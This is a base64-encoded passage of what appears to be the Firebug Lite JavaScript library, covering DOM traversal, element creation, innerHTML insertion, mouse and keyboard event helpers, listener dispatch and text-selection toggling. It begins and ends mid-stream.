RTaWJsaW5nKQ0KICAgIHsNCiAgICAgICAgaWYgKGNyaXRlcmlhKHNpYikpDQogICAgICAgICAgICByZXR1cm4gc2liOw0KDQogICAgICAgIHZhciBuZXh0ID0gdGhpcy5maW5kTmV4dERvd24oc2liLCBjcml0ZXJpYSk7DQogICAgICAgIGlmIChuZXh0KQ0KICAgICAgICAgICAgcmV0dXJuIG5leHQ7DQogICAgfQ0KDQogICAgaWYgKG5vZGUucGFyZW50Tm9kZSAmJiBub2RlLnBhcmVudE5vZGUgIT0gbWF4Um9vdCkNCiAgICAgICAgcmV0dXJuIHRoaXMuZmluZE5leHQobm9kZS5wYXJlbnROb2RlLCBjcml0ZXJpYSwgdHJ1ZSk7DQp9Ow0KDQp0aGlzLmZpbmRQcmV2aW91cyA9IGZ1bmN0aW9uKG5vZGUsIGNyaXRlcmlhLCBkb3duT25seSwgbWF4Um9vdCkNCnsNCiAgICBpZiAoIW5vZGUpDQogICAgICAgIHJldHVybiBudWxsOw0KDQogICAgZm9yICh2YXIgc2liID0gbm9kZS5wcmV2aW91c1NpYmxpbmc7IHNpYjsgc2liID0gc2liLnByZXZpb3VzU2libGluZykNCiAgICB7DQogICAgICAgIHZhciBwcmV2ID0gdGhpcy5maW5kUHJldmlvdXNVcChzaWIsIGNyaXRlcmlhKTsNCiAgICAgICAgaWYgKHByZXYpDQogICAgICAgICAgICByZXR1cm4gcHJldjsNCg0KICAgICAgICBpZiAoY3JpdGVyaWEoc2liKSkNCiAgICAgICAgICAgIHJldHVybiBzaWI7DQogICAgfQ0KDQogICAgaWYgKCFkb3duT25seSkNCiAgICB7DQogICAgICAgIHZhciBuZXh0ID0gdGhpcy5maW5kUHJldmlvdXNVcChub2RlLCBjcml0ZXJpYSk7DQogICAgICAgIGlmIChuZXh0KQ0KICAgICAgICAgICAgcmV0dXJuIG5leHQ7DQogICAgfQ0KDQogICAgaWYgKG5vZGUucGFyZW50Tm9kZSAmJiBub2RlLnBhcmVudE5vZGUgIT0gbWF4Um9vdCkNCiAgICB7DQogICAgICAgIGlmIChjcml0ZXJpYShub2RlLnBhcmVudE5vZGUpKQ0KICAgICAgICAgICAgcmV0dXJuIG5vZGUucGFyZW50Tm9kZTsNCg0KICAgICAgICByZXR1cm4gdGhpcy5maW5kUHJldmlvdXMobm9kZS5wYXJlbnROb2RlLCBjcml0ZXJpYSwgdHJ1ZSk7DQogICAgfQ0KfTsNCg0KdGhpcy5nZXROZXh0QnlDbGFzcyA9IGZ1bmN0aW9uKHJvb3QsIHN0YXRlKQ0Kew0KICAgIHZhciBpdGVyID0gZnVuY3Rpb24gaXRlcihub2RlKSB7IHJldHVybiBub2RlLm5vZGVUeXBlID09IDEgJiYgRkJMLmhhc0NsYXNzKG5vZGUsIHN0YXRlKTsgfTsNCiAgICByZXR1cm4gdGhpcy5maW5kTmV4dChyb290LCBpdGVyKTsNCn07DQoNCnRoaXMuZ2V0UHJldmlvdXNCeUNsYXNzID0gZnVuY3Rpb24ocm9vdCwgc3RhdGUpDQp7DQogICAgdmFyIGl0ZXIgPSBmdW5jdGlvbiBpdGVyKG5vZGUpIHsgcmV0dXJuIG5vZGUubm9kZVR5cGUgPT0gMSAmJiBGQkwuaGFzQ2xhc3Mobm9kZSwgc3RhdGUpOyB9Ow0KICAgIHJldHVybiB0aGlzLmZpbmRQcmV2aW91cyhyb290LCBpdGVyKTsNCn07DQoNCnRoaXMuaXNFbGVtZW50ID0gZnVuY3Rpb24obykNCnsNCiAgICB0cnkgew0KICAgICAgICByZXR1cm4gbyAmJiB0aGlzLmluc3RhbmNlT2YobywgIkVsZW1lbnQiKTsNCiAgICB9DQogICAgY2F0Y2ggKGV4KSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRE9NIE1vZGlmaWNhdGlvbg0KDQovLyBUT0RPOiB4eHhwZWRybyB1c2UgZG9jIGZyYWdtZW50cyBpbiBDb250ZXh0IEFQSSANCnZhciBhcHBlbmRGcmFnbWVudCA9IG51bGw7DQoNCnRoaXMuYXBwZW5kSW5uZXJIVE1MID0gZnVuY3Rpb24oZWxlbWVudCwgaHRtbCwgcmVmZXJlbmNlRWxlbWVudCkNCnsNCiAgICAvLyBpZiB1bmRlZmluZWQsIHdlIG11c3QgY29udmVydCBpdCB0byBudWxsIG90aGVyd2lzZSBpdCB3aWxsIHRocm93IGFuIGVycm9yIGluIElFIA0KICAgIC8vIHdoZW4gZXhlY3V0aW5nIGVsZW1lbnQuaW5zZXJ0QmVmb3JlKGZpcnN0Q2hpbGQsIHJlZmVyZW5jZUVsZW1lbnQpDQogICAgcmVmZXJlbmNlRWxlbWVudCA9IHJlZmVyZW5jZUVsZW1lbnQgfHwgbnVsbDsNCiAgICANCiAgICB2YXIgZG9jID0gZWxlbWVudC5vd25lckRvY3VtZW50Ow0KICAgIA0KICAgIC8vIGRvYy5jcmVhdGVSYW5nZSBub3QgYXZhaWxhYmxlIGluIElFDQogICAgaWYgKGRvYy5jcmVhdGVSYW5nZSkNCiAgICB7DQogICAgICAgIHZhciByYW5nZSA9IGRvYy5jcmVhdGVSYW5nZSgpOyAgLy8gYSBoZWxwZXIgb2JqZWN0DQogICAgICAgIHJhbmdlLnNlbGVjdE5vZGVDb250ZW50cyhlbGVtZW50KTsgLy8gdGhlIGVudmlyb25tZW50IHRvIGludGVycHJldCB0aGUgaHRtbA0KICAgIA0KICAgICAgICB2YXIgZnJhZ21lbnQgPSByYW5nZS5jcmVhdGVDb250ZXh0dWFsRnJhZ21lbnQoaHRtbCk7ICAvLyBwYXJzZQ0KICAgICAgICB2YXIgZmlyc3RDaGlsZCA9IGZyYWdtZW50LmZpcnN0Q2hpbGQ7DQogICAgICAgIGVsZW1lbnQuaW5zZXJ0QmVmb3JlKGZyYWdtZW50LCByZWZlcmVuY2VFbGVtZW50KTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgaWYgKCFhcHBlbmRGcmFnbWVudCB8fCBhcHBlbmRGcmFnbWVudC5vd25lckRvY3VtZW50ICE9IGRvYykNCiAgICAgICAgICAgIGFwcGVuZEZyYWdtZW50ID0gZG9jLmNyZWF0ZURvY3VtZW50RnJhZ21lbnQoKTsNCiAgICAgICAgDQogICAgICAgIHZhciBkaXYgPSBkb2MuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIGRpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgICAgICANCiAgICAgICAgdmFyIGZpcnN0Q2hpbGQgPSBkaXYuZmlyc3RDaGlsZDsNCiAgICAgICAgd2hpbGUgKGRpdi5maXJzdENoaWxkKQ0KICAgICAgICAgICAgYXBwZW5kRnJhZ21lbnQuYXBwZW5kQ2hpbGQoZGl2LmZpcnN0Q2hpbGQpOw0KDQogICAgICAgIGVsZW1lbnQuaW5zZXJ0QmVmb3JlKGFwcGVuZEZyYWdtZW50LCByZWZlcmVuY2VFbGVtZW50KTsNCiAgICAgICAgDQogICAgICAgIGRpdiA9IG51bGw7DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBmaXJzdENoaWxkOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIERPTSBjcmVhdGlvbg0KDQp0aGlzLmNyZWF0ZUVsZW1lbnQgPSBmdW5jdGlvbih0YWdOYW1lLCBwcm9wZXJ0aWVzKQ0Kew0KICAgIHByb3BlcnRpZXMgPSBwcm9wZXJ0aWVzIHx8IHt9Ow0KICAgIHZhciBkb2MgPSBwcm9wZXJ0aWVzLmRvY3VtZW50IHx8IEZCTC5GaXJlYnVnLmNocm9tZS5kb2N1bWVudDsNCiAgICANCiAgICB2YXIgZWxlbWVudCA9IGRvYy5jcmVhdGVFbGVtZW50KHRhZ05hbWUpOw0KICAgIA0KICAgIGZvcih2YXIgbmFtZSBpbiBwcm9wZXJ0aWVzKQ0KICAgIHsNCiAgICAgICAgaWYgKG5hbWUgIT0gImRvY3VtZW50IikNCiAgICAgICAgew0KICAgICAgICAgICAgZWxlbWVudFtuYW1lXSA9IHByb3BlcnRpZXNbbmFtZV07DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGVsZW1lbnQ7DQp9Ow0KDQp0aGlzLmNyZWF0ZUdsb2JhbEVsZW1lbnQgPSBmdW5jdGlvbih0YWdOYW1lLCBwcm9wZXJ0aWVzKQ0Kew0KICAgIHByb3BlcnRpZXMgPSBwcm9wZXJ0aWVzIHx8IHt9Ow0KICAgIHZhciBkb2MgPSBGQkwuRW52LmJyb3dzZXIuZG9jdW1lbnQ7DQogICAgDQogICAgdmFyIGVsZW1lbnQgPSB0aGlzLk5TICYmIGRvYy5jcmVhdGVFbGVtZW50TlMgPyANCiAgICAgICAgICAgIGRvYy5jcmVhdGVFbGVtZW50TlMoRkJMLk5TLCB0YWdOYW1lKSA6DQogICAgICAgICAgICBkb2MuY3JlYXRlRWxlbWVudCh0YWdOYW1lKTsgDQogICAgICAgICAgICANCiAgICBmb3IodmFyIG5hbWUgaW4gcHJvcGVydGllcykNCiAgICB7DQogICAgICAgIHZhciBwcm9wbmFtZSA9IG5hbWU7DQogICAgICAgIGlmIChGQkwuaXNJRSAmJiBuYW1lID09ICJjbGFzcyIpIHByb3BuYW1lID0gImNsYXNzTmFtZSI7DQogICAgICAgIA0KICAgICAgICBpZiAobmFtZSAhPSAiZG9jdW1lbnQiKQ0KICAgICAgICB7DQogICAgICAgICAgICBlbGVtZW50LnNldEF0dHJpYnV0ZShwcm9wbmFtZSwgcHJvcGVydGllc1tuYW1lXSk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGVsZW1lbnQ7DQp9Ow0KDQovLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLnNhZmVHZXRXaW5kb3dMb2NhdGlvbiA9IGZ1bmN0aW9uKHdpbmRvdykNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIGlmICh3aW5kb3cpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh3aW5kb3cuY2xvc2VkKQ0KICAgICAgICAgICAgICAgIHJldHVybiAiKHdpbmRvdy5jbG9zZWQpIjsNCiAgICAgICAgICAgIGlmICgibG9jYXRpb24iIGluIHdpbmRvdykNCiAgICAgICAgICAgICAgICByZXR1cm4gd2luZG93LmxvY2F0aW9uKyIiOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHJldHVybiAiKG5vIHdpbmRvdy5sb2NhdGlvbikiOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiAiKG5vIGNvbnRleHQud2luZG93KSI7DQogICAgfQ0KICAgIGNhdGNoKGV4YykNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19XSU5ET1dTIHx8IEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJUYWJDb250ZXh0LmdldFdpbmRvd0xvY2F0aW9uIGZhaWxlZCAiK2V4YywgZXhjKTsNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJUYWJDb250ZXh0LmdldFdpbmRvd0xvY2F0aW9uIGZhaWxlZCB3aW5kb3c6Iiwgd2luZG93KTsNCiAgICAgICAgcmV0dXJuICIoZ2V0V2luZG93TG9jYXRpb246ICIrZXhjKyIpIjsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEV2ZW50cw0KDQp0aGlzLmlzTGVmdENsaWNrID0gZnVuY3Rpb24oZXZlbnQpDQp7DQogICAgcmV0dXJuICh0aGlzLmlzSUUgJiYgZXZlbnQudHlwZSAhPSAiY2xpY2siICYmIGV2ZW50LnR5cGUgIT0gImRibGNsaWNrIiA/IA0KICAgICAgICAgICAgZXZlbnQuYnV0dG9uID09IDEgOiAvLyBJRSAiY2xpY2siIGFuZCAiZGJsY2xpY2siIGJ1dHRvbiBtb2RlbA0KICAgICAgICAgICAgZXZlbnQuYnV0dG9uID09IDApICYmIC8vIG90aGVycw0KICAgICAgICB0aGlzLm5vS2V5TW9kaWZpZXJzKGV2ZW50KTsNCn07DQoNCnRoaXMuaXNNaWRkbGVDbGljayA9IGZ1bmN0aW9uKGV2ZW50KQ0Kew0KICAgIHJldHVybiAodGhpcy5pc0lFICYmIGV2ZW50LnR5cGUgIT0gImNsaWNrIiAmJiBldmVudC50eXBlICE9ICJkYmxjbGljayIgPyANCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSA0IDogLy8gSUUgImNsaWNrIiBhbmQgImRibGNsaWNrIiBidXR0b24gbW9kZWwNCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAxKSAmJiANCiAgICAgICAgdGhpcy5ub0tleU1vZGlmaWVycyhldmVudCk7DQp9Ow0KDQp0aGlzLmlzUmlnaHRDbGljayA9IGZ1bmN0aW9uKGV2ZW50KQ0Kew0KICAgIHJldHVybiAodGhpcy5pc0lFICYmIGV2ZW50LnR5cGUgIT0gImNsaWNrIiAmJiBldmVudC50eXBlICE9ICJkYmxjbGljayIgPyANCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAyIDogLy8gSUUgImNsaWNrIiBhbmQgImRibGNsaWNrIiBidXR0b24gbW9kZWwNCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAyKSAmJiANCiAgICAgICAgdGhpcy5ub0tleU1vZGlmaWVycyhldmVudCk7DQp9Ow0KDQp0aGlzLm5vS2V5TW9kaWZpZXJzID0gZnVuY3Rpb24oZXZlbnQpDQp7DQogICAgcmV0dXJuICFldmVudC5jdHJsS2V5ICYmICFldmVudC5zaGlmdEtleSAmJiAhZXZlbnQuYWx0S2V5ICYmICFldmVudC5tZXRhS2V5Ow0KfTsNCg0KdGhpcy5pc0NvbnRyb2xDbGljayA9IGZ1bmN0aW9uKGV2ZW50KQ0Kew0KICAgIHJldHVybiAodGhpcy5pc0lFICYmIGV2ZW50LnR5cGUgIT0gImNsaWNrIiAmJiBldmVudC50eXBlICE9ICJkYmxjbGljayIgPyANCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAxIDogLy8gSUUgImNsaWNrIiBhbmQgImRibGNsaWNrIiBidXR0b24gbW9kZWwNCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAwKSAmJiANCiAgICAgICAgdGhpcy5pc0NvbnRyb2woZXZlbnQpOw0KfTsNCg0KdGhpcy5pc1NoaWZ0Q2xpY2sgPSBmdW5jdGlvbihldmVudCkNCnsNCiAgICByZXR1cm4gKHRoaXMuaXNJRSAmJiBldmVudC50eXBlICE9ICJjbGljayIgJiYgZXZlbnQudHlwZSAhPSAiZGJsY2xpY2siID8gDQogICAgICAgICAgICBldmVudC5idXR0b24gPT0gMSA6IC8vIElFICJjbGljayIgYW5kICJkYmxjbGljayIgYnV0dG9uIG1vZGVsDQogICAgICAgICAgICBldmVudC5idXR0b24gPT0gMCkgJiYgDQogICAgICAgIHRoaXMuaXNTaGlmdChldmVudCk7DQp9Ow0KDQp0aGlzLmlzQ29udHJvbCA9IGZ1bmN0aW9uKGV2ZW50KQ0Kew0KICAgIHJldHVybiAoZXZlbnQubWV0YUtleSB8fCBldmVudC5jdHJsS2V5KSAmJiAhZXZlbnQuc2hpZnRLZXkgJiYgIWV2ZW50LmFsdEtleTsNCn07DQoNCnRoaXMuaXNBbHQgPSBmdW5jdGlvbihldmVudCkNCnsNCiAgICByZXR1cm4gZXZlbnQuYWx0S2V5ICYmICFldmVudC5jdHJsS2V5ICYmICFldmVudC5zaGlmdEtleSAmJiAhZXZlbnQubWV0YUtleTsNCn07DQoNCnRoaXMuaXNBbHRDbGljayA9IGZ1bmN0aW9uKGV2ZW50KQ0Kew0KICAgIHJldHVybiAodGhpcy5pc0lFICYmIGV2ZW50LnR5cGUgIT0gImNsaWNrIiAmJiBldmVudC50eXBlICE9ICJkYmxjbGljayIgPyANCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAxIDogLy8gSUUgImNsaWNrIiBhbmQgImRibGNsaWNrIiBidXR0b24gbW9kZWwNCiAgICAgICAgICAgIGV2ZW50LmJ1dHRvbiA9PSAwKSAmJiANCiAgICAgICAgdGhpcy5pc0FsdChldmVudCk7DQp9Ow0KDQp0aGlzLmlzQ29udHJvbFNoaWZ0ID0gZnVuY3Rpb24oZXZlbnQpDQp7DQogICAgcmV0dXJuIChldmVudC5tZXRhS2V5IHx8IGV2ZW50LmN0cmxLZXkpICYmIGV2ZW50LnNoaWZ0S2V5ICYmICFldmVudC5hbHRLZXk7DQp9Ow0KDQp0aGlzLmlzU2hpZnQgPSBmdW5jdGlvbihldmVudCkNCnsNCiAgICByZXR1cm4gZXZlbnQuc2hpZnRLZXkgJiYgIWV2ZW50Lm1ldGFLZXkgJiYgIWV2ZW50LmN0cmxLZXkgJiYgIWV2ZW50LmFsdEtleTsNCn07DQoNCnRoaXMuYWRkRXZlbnQgPSBmdW5jdGlvbihvYmplY3QsIG5hbWUsIGhhbmRsZXIsIHVzZUNhcHR1cmUpDQp7DQogICAgaWYgKG9iamVjdC5hZGRFdmVudExpc3RlbmVyKQ0KICAgICAgICBvYmplY3QuYWRkRXZlbnRMaXN0ZW5lcihuYW1lLCBoYW5kbGVyLCB1c2VDYXB0dXJlKTsNCiAgICBlbHNlDQogICAgICAgIG9iamVjdC5hdHRhY2hFdmVudCgib24iK25hbWUsIGhhbmRsZXIpOw0KfTsNCg0KdGhpcy5yZW1vdmVFdmVudCA9IGZ1bmN0aW9uKG9iamVjdCwgbmFtZSwgaGFuZGxlciwgdXNlQ2FwdHVyZSkNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIGlmIChvYmplY3QucmVtb3ZlRXZlbnRMaXN0ZW5lcikNCiAgICAgICAgICAgIG9iamVjdC5yZW1vdmVFdmVudExpc3RlbmVyKG5hbWUsIGhhbmRsZXIsIHVzZUNhcHR1cmUpOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICBvYmplY3QuZGV0YWNoRXZlbnQoIm9uIituYW1lLCBoYW5kbGVyKTsNCiAgICB9DQogICAgY2F0Y2goZSkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19FUlJPUlMpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiRkJMLnJlbW92ZUV2ZW50IGVycm9yOiAiLCBvYmplY3QsIG5hbWUpOw0KICAgIH0NCn07DQoNCnRoaXMuY2FuY2VsRXZlbnQgPSBmdW5jdGlvbihlLCBwcmV2ZW50RGVmYXVsdCkNCnsNCiAgICBpZiAoIWUpIHJldHVybjsNCiAgICANCiAgICBpZiAocHJldmVudERlZmF1bHQpDQogICAgew0KICAgICAgICAgICAgICAgIGlmIChlLnByZXZlbnREZWZhdWx0KQ0KICAgICAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBlLnJldHVyblZhbHVlID0gZmFsc2U7DQogICAgfQ0KICAgIA0KICAgIGlmIChlLnN0b3BQcm9wYWdhdGlvbikNCiAgICAgICAgZS5zdG9wUHJvcGFnYXRpb24oKTsNCiAgICBlbHNlDQogICAgICAgIGUuY2FuY2VsQnViYmxlID0gdHJ1ZTsNCn07DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnRoaXMuYWRkR2xvYmFsRXZlbnQgPSBmdW5jdGlvbihuYW1lLCBoYW5kbGVyKQ0Kew0KICAgIHZhciBkb2MgPSB0aGlzLkZpcmVidWcuYnJvd3Nlci5kb2N1bWVudDsNCiAgICB2YXIgZnJhbWVzID0gdGhpcy5GaXJlYnVnLmJyb3dzZXIud2luZG93LmZyYW1lczsNCiAgICANCiAgICB0aGlzLmFkZEV2ZW50KGRvYywgbmFtZSwgaGFuZGxlcik7DQogICAgDQogICAgaWYgKHRoaXMuRmlyZWJ1Zy5jaHJvbWUudHlwZSA9PSAicG9wdXAiKQ0KICAgICAgICB0aGlzLmFkZEV2ZW50KHRoaXMuRmlyZWJ1Zy5jaHJvbWUuZG9jdW1lbnQsIG5hbWUsIGhhbmRsZXIpOw0KICANCiAgICBmb3IgKHZhciBpID0gMCwgZnJhbWU7IGZyYW1lID0gZnJhbWVzW2ldOyBpKyspDQogICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5hZGRFdmVudChmcmFtZS5kb2N1bWVudCwgbmFtZSwgaGFuZGxlcik7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gQXZvaWQgYWNlc3MgZGVuaWVkDQogICAgICAgIH0NCiAgICB9DQp9Ow0KDQp0aGlzLnJlbW92ZUdsb2JhbEV2ZW50ID0gZnVuY3Rpb24obmFtZSwgaGFuZGxlcikNCnsNCiAgICB2YXIgZG9jID0gdGhpcy5GaXJlYnVnLmJyb3dzZXIuZG9jdW1lbnQ7DQogICAgdmFyIGZyYW1lcyA9IHRoaXMuRmlyZWJ1Zy5icm93c2VyLndpbmRvdy5mcmFtZXM7DQogICAgDQogICAgdGhpcy5yZW1vdmVFdmVudChkb2MsIG5hbWUsIGhhbmRsZXIpOw0KICAgIA0KICAgIGlmICh0aGlzLkZpcmVidWcuY2hyb21lLnR5cGUgPT0gInBvcHVwIikNCiAgICAgICAgdGhpcy5yZW1vdmVFdmVudCh0aGlzLkZpcmVidWcuY2hyb21lLmRvY3VtZW50LCBuYW1lLCBoYW5kbGVyKTsNCiAgDQogICAgZm9yICh2YXIgaSA9IDAsIGZyYW1lOyBmcmFtZSA9IGZyYW1lc1tpXTsgaSsrKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMucmVtb3ZlRXZlbnQoZnJhbWUuZG9jdW1lbnQsIG5hbWUsIGhhbmRsZXIpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKEUpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIEF2b2lkIGFjZXNzIGRlbmllZA0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdGhpcy5kaXNwYXRjaCA9IGZ1bmN0aW9uKGxpc3RlbmVycywgbmFtZSwgYXJncykNCnsNCiAgICBpZiAoIWxpc3RlbmVycykgcmV0dXJuOw0KICAgIA0KICAgIHRyeQ0KICAgIHsvKiovDQogICAgICAgIGlmICh0eXBlb2YgbGlzdGVuZXJzLmxlbmd0aCAhPSAidW5kZWZpbmVkIikNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0RJU1BBVENIKSBGQlRyYWNlLnN5c291dCgiRkJMLmRpc3BhdGNoIiwgbmFtZSsiIHRvICIrbGlzdGVuZXJzLmxlbmd0aCsiIGxpc3RlbmVycyIpOw0KICAgIA0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBsaXN0ZW5lcnMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGxpc3RlbmVyID0gbGlzdGVuZXJzW2ldOw0KICAgICAgICAgICAgICAgIGlmICggbGlzdGVuZXJbbmFtZV0gKQ0KICAgICAgICAgICAgICAgICAgICBsaXN0ZW5lcltuYW1lXS5hcHBseShsaXN0ZW5lciwgYXJncyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRElTUEFUQ0gpIEZCVHJhY2Uuc3lzb3V0KCJGQkwuZGlzcGF0Y2giLCBuYW1lKyIgdG8gbGlzdGVuZXJzIG9mIGFuIG9iamVjdCIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmb3IgKHZhciBwcm9wIGluIGxpc3RlbmVycykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbGlzdGVuZXIgPSBsaXN0ZW5lcnNbcHJvcF07DQogICAgICAgICAgICAgICAgaWYgKCBsaXN0ZW5lcltuYW1lXSApDQogICAgICAgICAgICAgICAgICAgIGxpc3RlbmVyW25hbWVdLmFwcGx5KGxpc3RlbmVyLCBhcmdzKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCAoZXhjKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgew0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIiBFeGNlcHRpb24gaW4gbGliLmRpc3BhdGNoICIrIG5hbWUsIGV4Yyk7DQogICAgICAgICAgICAvL0ZCVHJhY2UuZHVtcFByb3BlcnRpZXMoIiBFeGNlcHRpb24gaW4gbGliLmRpc3BhdGNoIGxpc3RlbmVyIiwgbGlzdGVuZXIpOw0KICAgICAgICB9DQogICAgfQ0KICAgIC8qKi8NCn07DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZhciBkaXNhYmxlVGV4dFNlbGVjdGlvbkhhbmRsZXIgPSBmdW5jdGlvbihldmVudCkNCnsNCiAgICBGQkwuY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgIA0KICAgIHJldHVybiBmYWxzZTsNCn07DQoNCnRoaXMuZGlzYWJsZVRleHRTZWxlY3Rpb24gPSBmdW5jdGlvbihlKQ0Kew0KICAgIGlmICh0eXBlb2YgZS5vbnNlbGVjdHN0YXJ0ICE9ICJ1bmRlZmluZWQiKSAvLyBJRQ0KICAgICAgICB0aGlzLmFkZEV2ZW50KGUsICJzZWxlY3RzdGFydCIsIGRpc2FibGVUZXh0U2VsZWN0aW9uSGFuZGxlcik7DQogICAgICAgIA0KICAgIGVsc2UgLy8gb3RoZXJzDQogICAgew0KICAgICAgICBlLnN0eWxlLmNzc1RleHQgPSAidXNlci1zZWxlY3Q6IG5vbmU7IC1raHRtbC11c2VyLXNlbGVjdDogbm9uZTsgLW1vei11c2VyLXNlbGVjdDogbm9uZTsiOw0KICAgICAgICANCiAgICAgICAgLy8gY2FuY2VsaW5nIHRoZSBldmVudCBpbiBGRiB3aWxsIHByZXZlbnQgdGhlIG1lbnUgcG9wdXBzIHRvIGNsb3NlIHdoZW4gY2xpY2tpbmcgb3ZlciANCiAgICAgICAgLy8gdGV4dC1kaXNhYmxlZCBlbGVtZW50cw0KICAgICAgICBpZiAoIXRoaXMuaXNGaXJlZm94KSANCiAgICAgICAgICAgIHRoaXMuYWRkRXZlbnQoZSwgIm1vdXNlZG93biIsIGRpc2FibGVUZXh0U2VsZWN0aW9uSGFuZGxlcik7DQogICAgfQ0KICAgIA0KICAgIGUuc3R5bGUuY3Vyc29yID0gImRlZmF1bHQiOw0KfTsNCg0KdGhpcy5yZXN0b3JlVGV4dFNlbGVjdGlvbiA9IGZ1bmN0aW9uKGUpDQp7DQogICAgaWYgKHR5cGVvZiBlLm9uc2VsZWN0c3RhcnQgIT0gInVuZGVmaW5lZCIpIC8vIElFDQogICAgICAgIHRoaXMucmVtb3ZlRXZlbnQoZSwgInNlbGVjdHN0YXJ0IiwgZGlzYWJsZVRleHRTZWxlY3Rpb25IYW5kbGVyKTsNCiAgICAgICAgDQogICAgZWxzZSAvLyBvdGhlcnMNCiAgICB7DQogICAgICAgIGUuc3R5bGUuY3NzVGV4dCA9ICJjdXJzb3I6IGRlZmF1bHQ7IjsNCiAgICAgICAgICAgIA0KICAgICAgICAvLyBjYW5jZWxpbmcgdGhlIGV2ZW50IGluIEZGIHdpbGwgcHJldmVudCB0aGUgbWVudSBwb3B1cHMgdG8gY2xvc2Ugd2hlbiBjbGlja2luZyBvdmVyIA0KICAgICAgICAvLyB0ZXh0LWRpc2FibGVkIGVsZW1lbnRzDQogICAgICAgIGlmICghdGhpcy5pc0ZpcmVmb3gpDQogICAgICAgICAgICB0aGlzLnJlbW92ZUV2ZW50KGUsICJtb3VzZWRvd24iLCBkaXNhYmxlVGV4dFNlbGVjdGlvbkhhbmRsZXIpOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRE9NIEV2ZW50cw0KDQp2YXIgZXZlbnRUeXBlcyA9DQp7DQogICAgY29tcG9zaXRpb246IFsNCiAg